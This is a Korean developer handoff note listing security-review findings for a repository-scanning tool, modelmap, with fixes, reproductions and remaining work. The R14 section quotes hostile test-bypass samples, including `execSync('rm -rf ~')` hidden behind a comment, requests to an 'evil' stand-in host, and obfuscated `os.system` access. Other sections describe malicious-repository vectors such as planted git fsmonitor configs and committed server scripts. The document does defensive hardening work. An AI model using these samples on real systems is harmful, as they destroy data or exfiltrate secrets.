# 코드 검토 이후 남은 일 (handoff, 2026-11-24)

독립 검토(워커 1명, 읽기 전용, 기준 커밋 `15eb11b`)가 낸 지적 23건과, 수정 중에 새로 찾은 것 중 아직 안 고친 것을 모았다. 마지막으로 고친 커밋은 `a74fc65` 다. 검토 보고서 원문은 임시 폴더에 있어서 사라질 수 있으니, 이 문서만 읽고 일할 수 있게 어디·무엇·재현·제안을 모두 적었다. 줄 번호는 `15eb11b` 기준이라 R1~R6·R8 수정 뒤에는 어긋날 수 있다. `rg` 로 다시 찾을 것.
`docs/handoff.md`(2026-11-21)는 오래된 문서다(원격 없음, 첫 커밋만 있던 때). 현재 상태는 이 문서와 `UPSTREAM.md` §11~§16 이 기준이다.

## 1. 이미 고친 것

| ID | 내용 | 커밋 | 확인한 것 |
|---|---|---|---|
| R1 | Ask CLI 가 저장소의 `.claude/settings.json` 을 읽음 → `--setting-sources user` | 3e26498 | 가짜 CLI 인자만. 실제 CLI 로는 안 해 봄 |
| R2 | `session` 이 `--resume` 뒤 별도 인자로 들어감 → UUID 만 받고 `--resume=<id>` 한 인자 | 3e26498 | 가짜 CLI 인자 + `claude -p --resume --없는옵션` 이 "unknown option" 인 것 |
| R3 일부 | `.cache/server.json` 0600 | 3e26498 | 파일 모드 |
| R4 | git `core.fsmonitor` 등 저장소 설정으로 프로그램 실행 | a74fc65 | 아래 §1.1 |
| R5 | pyscan.py 메모리·CPU 폭주 | a74fc65 | 아래 §1.1 |
| R6 | 심볼릭 링크 `modelmap/` 로 저장소 밖에 씀 | a74fc65 | 아래 §1.1 |
| R8 | 정적 파일 경로가 심볼릭 링크를 따라감 (R21 의 Windows 8.3 이름 포함, 정적 검토만) | a74fc65 | 아래 §1.1 |
| R9 일부 | 4300 자리를 넘는 정수가 `json.dumps` 를 죽이던 것(3.11 이상) | a74fc65 | R5 의 `MAX_BITS = 1024` 로 그런 정수가 아예 안 만들어진다. 3.11 이상에서는 다시 돌려 보지 않았다 |
| R24 | `status.mjs` 가 `graph.json` 의 `head`·`path` 를 검사 없이 git 인자·`-C` 로 넘김 | R24·R7 수정 커밋 | 아래 §1.2 |
| R7 | `open.mjs` 와 `serve.mjs --stop` 이 저장소가 커밋한 `.cache/server.json` 을 믿음 | R24·R7 수정 커밋 | 아래 §1.2. 소유자 검사는 uid 를 바꾼 단위 시험뿐 |
| R18 일부 | `--stop` 이 죽이기 전에 서버의 `/api/status` 로 pid·root 를 확인함 | R24·R7 수정 커밋 | 같은 시험. 둘째 서버가 `server.json` 을 덮어쓰는 것은 그대로(§2.1) |

### 1.1 이번 라운드(R4·R5·R6·R8) 결과

워커가 만들고 조정자가 다시 확인했다. 시험 24개가 늘어 212개다(git-hardening 8, symlinks 7, pyscan-limits 8, serve 1). `node --test tests/*.test.mjs` 를 세 번 돌려 모두 212/212(약 12초), 함정용 `claude`·`codex` 를 PATH 맨 앞에 둔 실행에서도 한 번도 안 불렸다. Python 3.9.6(기본)에서 통과했고, 3.14.3 에서도 212/212 였다(워커가 돌림). 조정자가 임시 복사본에서 검토의 재현을 다시 돌렸다:

- R4: .git/config 에 `core.fsmonitor` 와 `.gitattributes` 의 `filter.<이름>.clean` 을 심은 저장소에서 scan·build·status 가 정상으로 끝나고 표식 파일이 만들어지지 않았다(수정 전에는 만들어졌다).
- R5: `'a'*100000` 을 12번 두 배로 늘리고 `1 << 8*10**8`, `pow(10, 10**7)`, `sum(range(10**12))` 까지 한 파일에 넣은 합친 폭탄이 0.16초, 최대 메모리 59 MB 로 끝나고 `Linear` 의 20개 파라미터가 그대로 나왔다(수정 전 `s = s + s` 하나가 843 MB).
- R6: `modelmap -> ../victim` 에서 scan 과 build 가 거부하고 종료 코드 1, `victim/` 에는 `.gitignore`(내용 `keep-me`)만 남았다.
- R8: 서버를 포트 0 으로 띄워 `/graph.json` 200, 바깥 파일·`.cache/server.json`·바깥 폴더로 가는 링크와 `/GRAPH.JSON` 은 404(본문 `not found`), `server.json` 은 0600. `graph.json` 이 링크이면 `serve.mjs` 가 시작을 거부한다.
- 뮤테이션 7개를 직접 돌렸다(fsmonitor 옵션 제거, 필터 무력화 제거, `str+str` 검사 제거, `<<` 검사 제거, `sum/range` 검사 제거, scan.mjs 의 링크 거부 제거, 정적 파일의 realpath 비교 제거): 모두 해당 시험이 빨개졌고 되돌리면 33개가 모두 통과했다. 워커는 가드 종류별로 더 많이 했다(UPSTREAM.md §16).

닫은 git 경로, 닫지 못한 것, 새 한도(`MAX_SEQ` 100,000, `MAX_BITS` 1024, `MAX_NODES` 10,000, 메모리 1.5 GB)는 `UPSTREAM.md` §16 에 있다. 아직 열린 것은 아래 §2 에 다시 적었다.

### 1.2 이번 라운드(R24·R7) 결과

시험 17개가 늘어 229개다(`trusted-{values,checks,server,stop,flows}.test.mjs`). `node --test tests/*.test.mjs` 를 세 번 돌려 모두 229/229(18~19초; 전에는 12초쯤), 함정용 `claude`·`codex` 를 PATH 맨 앞에 둔 실행에서도 한 번도 안 불렸다. 수정을 하나씩 되돌린 복사본에서 새 시험이 빨개지는 것을 확인했다(`UPSTREAM.md` §17).

- R24: `head` 에 `--output=<파일>`·`--stat`·`-p`·대문자·6자·65자·`HEAD`·`main` 등 20가지, `path` 에 `..`·절대 경로·`-x`·`--output=`·링크 등 21가지를 넣어도 git 이 한 번도 불리지 않고 파일이 안 생긴다(PATH 의 `git` 껍데기가 기록). 정상 지도의 "same commit"·"N file(s) changed since"·uncommitted 는 그대로다.
- R7: 29가지 틀린 `server.json` 과 링크를 `open.mjs`·`--stop` 에 넣어도 흉내 서버가 받은 요청이 0, 살아 있는 `sleep` 이 안 죽고, 적대적 주소가 출력·브라우저에 안 간다. 서버가 pid·root 를 맞게 답할 때만 pid 를 죽인다.

## 2. 고쳐야 할 것, 먼저 할 순서대로

### 2.0 R28 (HIGH, 재현함) `open.mjs` 가 저장소에 커밋된 `modelmap/serve.mjs` 를 그대로 실행함

R24·R7 수정 중에 워커가 "다른 종류라 고치지 않았다"며 보고했고, 조정자가 재현했다. `skills/modelmap/scripts/open.mjs` 는 `<map>/serve.mjs`(`serveFile`)를 `node` 로 띄운다. `modelmap/` 아래는 저장소가 통째로 커밋할 수 있다. 이 폴더는 build 가 모든 파일을 새로 쓸 때만 믿을 수 있는데, open 은 build 를 거쳤는지 확인하지 않는다.
- 재현: 임시 저장소에 `modelmap/index.html` 과, 표식 파일을 만드는 `modelmap/serve.mjs` 만 두고 `node open.mjs <repo> --no-open` 을 돌리면 그 `serve.mjs` 가 실행된다(`ran as --no-open --idle-exit 120`). `open.mjs` 는 `index.html` 과 `serve.mjs` 가 있는지만 본다.
- 현실성: `status.mjs` 는 `graph.json` 이 있으면 "map" 이라고 알리고(`A map exists…`), 그러면 곧바로 open 으로 가기 쉽다. build 가 `modelmap/.gitignore` 에 `*` 를 쓰므로 저장소가 이 폴더를 커밋하려면 강제로 넣어야 하지만, 악의적인 저장소는 그렇게 한다.
- 같은 종류(코드·페이지가 저장소 것): (1) Ask 가 허용하는 명령 `node modelmap/query.mjs` 는 저장소가 커밋한 `query.mjs` 이기도 하다(`serve.mjs` 의 `--allowedTools Bash(node modelmap/query.mjs:*)`). (2) `serve.mjs` 는 `modelmap/index.html` 을 읽어 토큰을 넣어 내보낸다. 저장소가 커밋한 `index.html` 은 자기 스크립트를 가지고 있고 토큰을 읽어 `/api/ask` 를 부를 수 있다(CSP 는 build 가 쓴 페이지에만 있다). (3) `serve.mjs` 가 `import` 하는 `page-safety.mjs`.
- 제안(워커가 고른다): (a) 가장 튼튼한 것: open 과 `--stop` 이 지도 폴더의 코드를 실행하지 않는다. 플러그인 자신의 `assets/serve.mjs`·`query` 코드를 `--map <폴더>` 로 실행하고 `modelmap/` 아래는 데이터로만 읽는다(`index.html` 은 build 가 템플릿과 `graph.json` 으로 다시 만들거나, 서버가 읽을 때 플러그인 템플릿에서 만든다). (b) 더 작은 것: open 이 실행 전에 `serve.mjs`·`query.mjs`·`page-safety.mjs` 의 해시를 플러그인의 원본(`assets/`)과 대조하고 다르면 거부하며 "build.mjs 를 먼저 돌려라" 라고 말한다. `index.html` 은 build 가 템플릿에서 만든 것이므로 `graph.json` 에서 다시 만들어 비교하거나, 플러그인이 자기 템플릿으로 다시 쓴다. (c) 응급처치: `SKILL.md` 의 순서에서 open 전에 항상 `build.mjs` 를 돌리도록 하고, `open.mjs` 가 `graph.json` 에 기록된 빌드가 이 컴퓨터의 것이 아니면 거부한다(저장소가 이 표식도 커밋할 수 있어 근본 해결은 아니다).
- 시험: 위 재현을 시험으로 만든다(표식 파일이 안 생기고 종료 코드 1과 설명이 나옴). 정상 흐름(scan → build → open)은 그대로 통과해야 한다. Ask 의 `query.mjs` 쪽은 가짜 CLI 로, 저장소가 커밋한 `query.mjs` 가 실행되지 않는 것을 본다.

### 2.0b R24 (고침) `status.mjs` 가 `graph.json` 의 값을 검사 없이 git 인자로 넘김

`UPSTREAM.md` §17 에 고친 내용과 남은 것이 있다(`head` 는 소문자 hex 7~64자, `path` 는 저장소 안의 상대 경로일 때만 git 에 준다; R7 과 한 번에 고쳤다).

### 2.1 R1·R2·R3 의 남은 부분 (서버, 보안)

- **R3 나머지, 토큰이 페이지에 박혀 있음** (`serve.mjs` 의 `inject`, `/` 경로). `GET /` 한 번이면 같은 컴퓨터의 누구나 Ask 토큰을 얻는다. 개인 Mac 한 대면 위험이 낮고, 여러 사용자가 쓰는 서버면 높다. 고치려면 설계를 바꿔야 한다: `open.mjs` 가 여는 주소를 `/#t=<token>` 으로 하고 페이지가 해시에서 읽거나, 첫 방문에 HttpOnly·SameSite=Strict 쿠키를 심는다. floorplan 에서 온 구조라 `viewer.html`·`serve.mjs` 둘 다 바뀐다. 결정 필요.
- **R1 나머지, 저장소의 CLAUDE.md 는 계속 읽힘.** `--setting-sources` 는 settings 만 막는다. 프롬프트 주입 통로가 남는다. `--safe-mode`(CLAUDE.md·훅·스킬 모두 끔)나 `--bare` 를 쓸지, 그때 인증과 도구가 그대로인지 **실제 CLI 로 한 번 확인**해야 한다. 모델 호출이 필요하니 사용자 허락을 받고 할 것.
- **R1 확인 안 됨:** `--setting-sources user` 가 실제 CLI 에서 프로젝트 훅을 막는지. 확인 방법: 임시 저장소에 `.claude/settings.json` 으로 `SessionStart` 훅(`touch /tmp/marker`)을 두고 `serve.mjs` 가 만드는 인자로 `claude -p` 를 한 번 돌려 마커가 생기는지 본다(허락 필요).
- **R2 가정:** 실제 CLI 의 `session_id` 가 항상 UUID 라는 것. 아니면 후속 질문이 `bad_session` 으로 거절된다.
- **R16 (MEDIUM) Ask 자식 프로세스가 서버의 환경 변수를 전부 물려받음** (`serve.mjs` `cliEnv`). `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`, 클라우드 키, `NODE_OPTIONS`, `PATH` 가 그대로 간다. 다른 결함과 합쳐져야 악용된다. 제안: 최소 환경(HOME, PATH, LANG, TERM, CLI 의 인증 변수)만 넘기고 `NODE_OPTIONS`·`PYTHON*` 은 뺀다. 가짜 CLI 로 환경을 기록해 테스트할 수 있다.
- **R19 (LOW) 동시 `/api/ask` 제한 없음, `/api/cancel` 이 모든 질문을 죽임.** 제안: 동시 1~2개로 제한하고 대기열을 두며, 취소는 `start` 이벤트가 돌려주는 id 로 한다.
- **R18 (LOW) 같은 지도에 `serve.mjs` 가 둘 뜨면 `server.json` 을 덮어씀.** 첫 서버는 `--stop` 으로 못 찾고(수동 시작은 idle 종료 0), 낡은 `server.json`(재사용된 pid)이면 `--stop` 이 남의 프로세스를 죽일 수 있다. 한 번 실제로 겪은 일이다. **절반은 했다(`UPSTREAM.md` §17):** `--stop` 과 open.mjs 의 재시작은 죽이기 전에 `/api/status` 로 pid 와 이 지도의 root 를 확인한다. 남은 것: 시작할 때 살아 있는 같은 지도의 서버가 있으면 거부하거나 `wx` 잠금 파일을 쓰는 것(둘째 서버가 `server.json` 을 덮어쓰면 첫 서버를 `--stop` 이 못 찾는다).

### 2.2 R7 (고침) `open.mjs` 가 저장소가 커밋한 `server.json` 을 믿음

`UPSTREAM.md` §17 에 고친 내용과 남은 것이 있다(`open.mjs` 와 `serve.mjs --stop`; 검사를 통과한 서버만 믿고, 그 뒤에야 pid 를 죽인다).

### 2.3 스캐너 견고성과 숫자 (pyscan.py·lib)

- **R9 (MEDIUM, 재현함) 파일 하나가 `ast.parse` 를 터뜨리면 스캔 전체가 죽음.** `pyscan.py:387`(`ast.parse`), `:1802`(OSError·ValueError·RecursionError 만 잡음), `:1829`(루트 `instantiate` 가 안 감싸짐), `:1264`(set_attr 의 `ast.unparse`), `:1339`(재귀 `mod_json`), `:1846`(`json.dumps`), `scan.mjs:65`.
  - `x = 1+1+…`(40만 항) 파일 하나만 있어도 Python 3.9.6 에서 세그폴트, 3.14.3 에서도 `✗ python3 stopped with status null:` 만 나온다(이유 없음). `tests/` 아래 파일이어도 같다. 3.14 에서 `------…1`(100만 개)은 `MemoryError`("Parser stack overflowed")가 잡히지 않아 트레이스백으로 끝난다.
  - 8192 단 깊이로 `m = nn.Sequential(m)` 를 두 번의 루프로 쌓으면 `mod_json` 의 `RecursionError`. `self.d_model = 1+1+…`(2500 항)이면 `ast.unparse` 에서 같은 오류(`d_model` 이 차원 이름이라서).
  - (3.11 이상에서 4300 자리를 넘는 정수가 `json.dumps` 를 죽이던 것은 R5 의 `MAX_BITS` 로 닫혔을 것이다. 다시 돌려 보지는 않았다.)
  제안: 파일마다 자식 프로세스로 파싱하거나 `MemoryError` 를 파일 단위로 잡는다. 루트 instantiate·mod_json·dims 를 `except (RecursionError, MemoryError)` 로 감싼다. `mod_json` 은 반복식이나 깊이 상한으로. `jv()` 는 `bit_length() > 64` 정수를 `{"unknown": "number too large"}` 로. `scan.mjs` 는 `r.signal` 을 출력한다.
- **R10 (MEDIUM, 재현함) 단계 예산이 루트 `__init__` 안에서 바닥나면 "✗ class Net was not found".** `pyscan.py:29`(MAX_STEPS 600000), `:1836-1838`, `scan.mjs:74`. 재현: `Net.__init__` 안에 `for i in range(4096): for j in range(200): x = i + j`. 경고 문구는 "트리가 일부일 수 있다"인데 결과는 트리 없음과 거짓 메시지다. 제안: 예산이 끝나면 그때까지 만든 트리(`run_init` 이 `mod` 를 들고 있음)를 불완전 표시로 내고, 루트가 없을 때 `scan.mjs` 가 경고를 출력한다. R5 의 메모리 보조 장치(1.5 GB)도 같은 `Budget` 을 던지므로 같이 영향을 받는다. `Budget` 의 메시지는 이제 무엇이 바닥났는지(`memory limit exceeded` 또는 단계 예산)를 담는다.
- **R11 (MEDIUM, 재현함) 접기(fold)가 구조와 묶인 가중치가 다른 형제를 합침.** `lib/fold.mjs:9-16`(서명이 클래스와 인자 값뿐), `:24`. 같은 `Blk(8)` 세 개를 만든 뒤 `self.blocks[2].extra = nn.Linear(8, 1000)` 를 붙이면 지도에는 `0…2  Blk  ×3  72` 로 나오고, 세 번째의 9,000 개 모듈 `extra` 는 카드가 없다. 총합(10,016)은 맞지만 "복사본마다 72"가 틀리고 모듈이 사라진다. 가중치 공유(`self.blocks[0].fc.weight = self.emb.weight`)가 섞이면 총합도 틀린다(검토자 재현: 9,152). 제안: 서명에 자식 서명을 재귀로(이름과 서명), `tied` 맵, `params` 형태를 넣는다.
- **R12 (MEDIUM, 재현함) `yaml.mjs` 가 YAML 1.2 코어 스키마로 읽음.** `lib/yaml.mjs:44-60`. ML 설정은 PyYAML·OmegaConf(YAML 1.1)로 읽힌다. 재현 결과(`parseYaml`): `no`·`yes` 는 문자열(PyYAML 은 false·true), `1_000` 은 문자열(PyYAML 은 1000), `012` 는 12(PyYAML 은 8), `1e3` 은 숫자 1000(PyYAML 은 문자열). 그래서 `if cfg["use_extra"]:` 가 틀린 쪽으로 가고 파라미터 수가 틀린다(검토자 예: 2,002,000 vs 실제 1,001,000, 그런데 "(every part known)" 로 표시). 제안: YAML 1.1 스칼라 규칙을 쓰거나, 두 규칙이 다르게 읽는 값(yes·no·on·off·y·n, 지수만 있는 수, 밑줄, 앞자리 0)은 알 수 없음으로 두어 `≥`·`?` 로 나오게 한다.
- **R13 (MEDIUM) 저장소 클래스의 `register_buffer` 가 weights 합계를 부풀림.** `lib/safetensors.mjs:218-231`(`byPath` 가 모든 텐서를 더함), `pyscan.py:841`(`register_buffer` 무시). `nn.Linear(4,4)` 에 `register_buffer("mask", torch.ones(64,64))` 를 두고 파일에 fc.weight·fc.bias·mask 를 넣으면 "In the weights 4,116 [weights]" 가 ✓ 와 함께 나온다. nanoGPT 식 체크포인트의 인과 마스크 버퍼면 층마다 약 100만이다. 가장 강한 출처 태그(weights)의 숫자가 틀린다. 제안: `register_buffer` 이름(알면 모양)을 pyscan 이 기록하고 그 키를 파라미터 합에서 빼거나 버퍼로 표시한다.
- **R17 (LOW) FIFO 가 `.py` 이름이면 스캔이 멈춤.** `pyscan.py:1796`(`open(full,"rb")`), `lib/common.mjs:47`(걷기가 심볼릭 링크는 건너뛰지만 FIFO 는 아님). git 에는 FIFO 가 안 들어가니 압축 파일·공유 폴더에서 온 비 git 폴더가 대상이다. 120 초 제한까지 걸린다. 제안: `stat.S_ISREG` 확인 후 열기, 걷기에서 `e.isFile()` 만.
- **R23 (LOW) 가상 노드 id 가 실제 id 와 안 겹치게 보장되지 않음.** `lib/flow.mjs:246`(`<node id>#<end>`), `graph.mjs` `idFor`. `ModuleDict` 키나 `add_module` 이름에 `#` 가 있으면(`"blk#in"`) 두 노드 id 가 같아진다. 제안: `idFor` 의 `used` 집합을 거치거나 `v:` 접두어.
- **R25 (MEDIUM, 재현함) docstring shape 정규식이 이차 시간.** `pyscan.py:1593` 의 `SHAPE_RE`(`\s*,?\s*` 가 겹침). `'(a' + ' ' * n + '!'` 에서 n = 5,000 에 0.14초, 10,000 에 0.53초, 20,000 에 2.2초(두 배마다 4배); 워커는 50,000 에서 20초를 넘겼다고 했다. docstring 하나가 2 MB 파일 안에 여러 개면 120초 제한에 걸려 스캔 전체가 실패한다. 제안: `\s*` 를 한 번만 두고 `\s*,?\s*` 를 `(?:\s|,)*` 같은 하나로 바꾸거나, 정규식에 넣기 전에 줄 길이를 제한한다.
- **R26 (LOW) `scan.mjs --json` 이 큰 출력을 파이프에서 자름.** 약 64 KB 에서 잘린다(`console.log` 직후 `process.exit(0)`, `scan.mjs:108`). 시험은 `--out` 의 `scan.json` 을 읽어서 못 잡았다. 제안: `process.exitCode` 로 두고 스스로 끝나게 하거나 쓰기 완료 콜백 뒤에 끝낸다.
- **R29 (LOW) `status.mjs` 가 `graph.json` 의 문자열(`rootName`, `generatedAt` 등)을 걸러 내지 않고 터미널에 찍음.** 터미널 제어 문자(이스케이프 시퀀스)가 그대로 나갈 수 있다. 저장소 이름과 경로 표시에 쓰는 `shown()` 처럼 제어 문자와 길이를 거르는 함수를 모든 출력 문자열에 쓴다. (`R24` 의 수정에서 `path` 만 걸렀다.)
- **R27 (LOW) R6 이 닫지 못한 쓰기 경로.** `lib/claudemd.mjs`(저장소 루트에 `CLAUDE.local.md` 를 씀)와 `keepOutOfGit` 은 링크 검사를 거치지 않는다. 지금은 어느 스크립트도 부르지 않지만(build 가 `claudemd` 를 호출하지 않는다) 부르게 되면 같은 검사를 넣어야 한다. 읽기는 여전히 링크를 따라간다(`descriptions/*.json`, `scan.json`, `--scan`·`--config`·`--weights`).
- **R5 의 남은 틈 (LOW).** 한도 안의 값이 쌓여서 커지는 경우(예: 10만 원소 리스트 200개)는 1.5 GB 메모리 보조 장치만 막는다. `ast.parse` 와 AST 보관 같은 파일을 읽을 때의 메모리는 그 장치 밖이다(R9 와 같은 뿌리). 같은 하위 리스트를 64번씩 되풀이한 중첩 값은 `str()`·출력에서는 막지만 `==`·튜플 사전 키의 해시는 막지 않는다.
- **R4 의 남은 틈 (MEDIUM, 시험 불가).** Ask 가 띄우는 `claude`·`codex` 는 저장소 안에서 자기 git 을 부른다(Claude Code 는 시작할 때 `git status` 를 읽는다). 이 길은 우리 `gitRun` 을 거치지 않으므로 저장소의 `core.fsmonitor` 가 거기서는 실행될 수 있다. 실제 CLI 로만 확인할 수 있다(허락 필요). 막으려면 CLI 의 작업 폴더를 저장소가 아닌 곳으로 옮기고 `--add-dir` 를 쓰거나, CLI 에 `GIT_CONFIG_*`·`GIT_CONFIG_GLOBAL` 환경 변수로 `core.fsmonitor=false` 를 주는 방법이 있다(R16 의 환경 정리와 같이 볼 것). git 2.26 보다 오래된 git(`--show-scope` 없음)의 대체 경로는 시험하지 못했다.
- **작은 항목:** (a) `fold.mjs`: 모르는 인자 둘이 같은 이유 문구면 같다고 보아 "같은 클래스, 같은 인자" 문구가 거짓일 수 있다(개수는 이미 하한). (b) `params.mjs`: `a.weight = b.weight` 와 `b.weight = a.weight` 가 서로 묶이면 둘 다 빼서 과소 집계(읽어서 확인), 트리에 없는 가중치에 묶인 것도 뺀다. (c) `serve.mjs`: `MODES[body.mode] || MODES.ask` 가 일반 객체라 `mode: "constructor"` 가 `Object` 를 고른다(충돌은 안 남, `Object.hasOwn` 이 낫다). (d) 세그폴트 실패 메시지가 `status null:` 이다(R9 와 함께).

### 2.4 테스트와 문서

- **R14 (MEDIUM, 재현함) `tests/supply-chain.test.mjs` 가 쉬운 우회를 못 잡음.** `:34`(`/*`·`*` 로 시작하는 줄을 통째로 건너뜀), `:140`(맨 `spawn(` 만), `:170`, `:232`. 검토자가 메모리 상의 복사본에 심은 아래 변경이 모두 `[]`(통과)를 돌려줬다. R4~R8 수정으로 git 호출이 한 곳으로 모였다면 그 핀이 어떻게 바뀌었는지도 같이 볼 것.
  - serve.mjs 의 `import * as cp from 'node:child_process'; cp.spawn('sh', …)`, describe.mjs 의 `/* x */ execSync('rm -rf ~')`, `const { spawn: run } = …; run('sh')`, serve.mjs 의 `import { request } from 'node:http'; request('http://evil')`, `process.binding('spawn_sync')`, viewer.html 의 `location.href='https://evil/?'+…`.
  - pyscan.py 의 `os.open(..., os.O_WRONLY|os.O_CREAT)`, `os.write`, `os.posix_spawn`, `getattr(os,'sys'+'tem')`, `os.symlink`.
  제안: 멤버 호출(`\.(spawn|exec\w*|fork)\s*\(`)과 별칭도 잡고, 주석으로 `시작`하는 줄만 건너뛴다. `process.binding`·`dlopen` 과 `http` 의 `createServer` 이외 이름 가져오기를 금지한다. Python 은 `os.` 속성을 허용 목록으로 두고 `getattr(os` 를 금지한다. 페이지는 `location` 대입과 절대 주소 `window.open` 을 금지한다.
- **R15 (MEDIUM) 문서의 거짓 문장.** `SKILL.md:3`("코드를 텍스트로 읽고 절대 실행하지 않는다")는 우리 스크립트의 git 호출에 대해서는 R4 수정으로 맞게 됐다(`UPSTREAM.md` §16 의 목록). 그러나 Ask 가 띄우는 CLI 의 git 은 아직 아니다(위 R4 남은 틈). R24 는 닫혔다(`UPSTREAM.md` §17). 그때까지 문구를 "스캐너는 저장소의 코드를 실행하지 않는다" 정도로 좁히거나 한계를 덧붙일 것. `SKILL.md:25`("모든 것이 이 컴퓨터에 머문다")는 R7 이 고쳐져서 우리 스크립트에 대해서는 맞다(요청은 검사를 통과한 `http://127.0.0.1:<port>` 로만 간다). Ask 가 띄우는 CLI 가 모델 서버와 주고받는 것은 이 문장이 다루지 않는다. `UPSTREAM.md:188,195,202` 의 "Python 3.9 미확인"은 거꾸로다: 이 기계의 비대화형 `python3` 는 `/usr/bin/python3` 3.9.6 이라 182(지금은 더 많은) 테스트가 3.9 로 돌았다. 안 돌려 본 쪽은 3.11 이상이다(R9 의 정수 자릿수 제한). `tests/supply-chain.test.mjs` 의 주석("항상 http://127.0.0.1")은 검사가 생겨서 맞게 됐고 그 검사를 고정하는 항목도 더했다. 테스트가 쓰는 인터프리터를 한 번 출력해 기록할 것.
- **R22 (LOW) `hasPython` 이 `python3` 만 찾음.** `tests/helpers.mjs:12`. 없으면 Python 의존 테스트가 전부 skip 되고 실행은 성공으로 끝난다(`scan.mjs` 는 `python` 으로도 폴백함). CI 가 초록인데 스캐너를 시험 안 한 상태가 될 수 있다. 제안: `MODELMAP_REQUIRE_PY=1` 이면 skip 이 하나라도 있을 때 실패하고, `scan.mjs` 가 시도하는 인터프리터를 같게 찾는다.
- **R20 (LOW, 정적) `readdirSync(..., {recursive: true})` 는 Node 18.17 / 20.1 부터.** `tests/helpers-plugin.mjs:16,34`, `tools/checksums.mjs:23`. 18.0~18.16 은 옵션을 조용히 무시해서 최상위만 나열하고 supply-chain 테스트가 거의 아무것도 검사하지 않은 채 통과한다. 제안: 작은 재귀 걷기, 또는 계획에 "Node ≥ 18.17" 명시. (배포되는 스킬 코드는 Node 18 API 만 쓴다. 전역 `fetch` 는 18 에서 실험 기능 경고가 뜬다.)
- **불안정하다던 "worksheet: hostile" 테스트**(`describe.test.mjs`)는 검토자가 11번 돌려도 재현되지 않았다. 확인하려면 전체 스위트를 `--test-concurrency=16` 으로 부하 상태에서 반복하고, 실패하면 `describe.mjs` 의 stderr 를 남긴다.

### 2.5 R21 (LOW, Windows, 확인 안 됨)

NTFS 에서 8.3 이름이 켜져 있으면 `.cache` 에 `CACHE~1` 같은 짧은 이름이 있어 `GET /CACHE~1/server.json` 이 점 이름 규칙을 지나 토큰을 줄 수 있다. R8 수정(`a74fc65`)이 `realpathSync.native` 로 실제 경로를 확인하고 실제 경로 어느 구간이든 점으로 시작하면 거부하므로 닫혔을 것으로 보지만 Windows 에서 확인한 적은 없다. 확인: Windows 에서 `dir /x modelmap` 과 위 요청.

## 3. 검토하지 않은 것

- `docs/plan-mvp.html` 과 실제 구현의 대조(이식성 목표 외), 커밋 메시지와 diff 의 대조(`UPSTREAM.md` 줄 수 외).
- `viewer.html` 에서 floorplan 원본 그대로인 부분, serve.mjs 의 Codex 경로, `describe.mjs` 워크시트 펜스의 세부(테스트는 통과), 읽기 전용 폴더에서의 동작.
- Node 18 과 Windows 의 실제 실행, 실제 Claude CLI(검토 중에는 금지).

## 4. 검토가 문제를 찾지 못한 것 (다시 보지 않아도 되는 곳)

페이지 XSS(적대적 저장소로 headless Chrome 에서 모든 노드를 선택·진입·hover 해도 주입된 요소 없음, CSP 는 해시 방식 `script-src`), `..`·인코딩 점·백슬래시 경로 탈출, Host·Origin 검사, 토큰 엔트로피(128비트), 본문 크기 제한, 레이어 파라미터 공식(Linear, Bilinear, Conv·ConvTranspose, MHA, LayerNorm, RMSNorm, GroupNorm, BatchNorm, InstanceNorm, Embedding, PReLU)과 `state_dict` 키 이름, 단순 가중치 공유(한 번만 뺌), `≥` 가 접기·합산을 통과함, safetensors 헤더 제한과 오프셋 검사, 쿼리 도구(`__proto__` 등 id, 한도), `floorplanAskInstructions` 가 절대 경로를 안 싣는 것, `writing-descriptions.md` 의 JSON 예시가 `describe.mjs --check` 를 통과하는 것, 공백·한글 경로, 비 git 저장소, python3 없을 때의 메시지, 스크립트의 쓰기 범위, 심볼릭 링크 `/etc/passwd` 가 git 모드에서 건너뛰어지는 것, 120 초 제한 때 자식이 남지 않는 것.

## 5. 일하는 방법 (이 프로젝트에서 써 온 순서)

1. 지적 하나(또는 같은 파일의 묶음)마다 명세를 쓰고 워커에게 맡긴다. 명세에 범위 밖 항목, 하지 말 것, 보고 형식을 적는다.
2. 재현 테스트는 수정 전에 빨갛고 후에 초록이어야 한다. 수정을 하나씩 되돌린 임시 복사본에서 새 테스트가 실패하는지 보인다(뮤테이션 점검). 안 빨개지는 테스트는 다시 쓴다.
3. 전체 스위트를 세 번 돌리고, 함정용 `claude`·`codex`(PATH 맨 앞, 실행되면 로그에 한 줄)를 두고 한 번 더 돌려 로그가 안 생겼는지 본다.
4. 조정자가 diff 를 직접 읽고 위 검증을 독립적으로 다시 한다. 커밋은 사용자가 요청할 때만 한다.
5. 실제 `claude` 호출은 사용자가 허락한 경우만(AB-UPT 종단 시험이 한 번 있었다). 4378 포트의 서버(AB-UPT 지도)와 `~/MySpace/papers/anchored-branched-universal-physics-transformers` 는 건드리지 않는다.
6. 벤더 파일 11개(`UPSTREAM.md` §4)는 바이트가 같아야 하고(`tests/supply-chain.test.mjs` 가 해시로 확인), floorplan 에서 온 파일은 "Derived from floorplan v0.11.0 (MIT)" 머리말을 유지한다.

## 6. 권장 순서

1. **R28** (HIGH, 저장소가 커밋한 코드·페이지가 실행되거나 토큰을 받는 것: `open.mjs`, Ask 의 `query.mjs`, `index.html`). 공개 저장소에서 가장 먼저 닫을 것.
2. **R16 + R18 의 나머지 + R19** (서버 쪽, 한 워커): 모두 `serve.mjs`·`open.mjs` 의 작은 변경이고 가짜 CLI 로 시험할 수 있다. R18 은 `--stop` 이 죽이기 전에 `/api/status` 로 확인하는 절반을 했고(`UPSTREAM.md` §17), 서버가 둘 뜨는 것을 막는 절반이 남았다.
3. **R1 확인 + R3 나머지 + CLAUDE.md + R4 의 Ask 쪽 git** (사용자 결정과 실제 CLI 호출 1~2회가 필요).
4. **R9 + R10 + R17 + R25 + R26** (스캐너 견고성, pyscan.py·scan.mjs).
5. **R11 + R12 + R13** (숫자 정확성: 접기, YAML 1.1, 버퍼). "아는 척하지 않기"(`?`·`≥`)가 원칙이다.
6. **R14 + R22 + R20 + R15 + R23 + R27 + R29 + 작은 항목** (테스트와 문서).
7. 그다음에 `docs/decisions.md` 의 열린 항목: 라이선스 결정, 연구 저장소 3~5곳에서의 해결률 측정, torch `numel()` 대조, README, 아직 미작성인 `UPSTREAM.md` 행들.
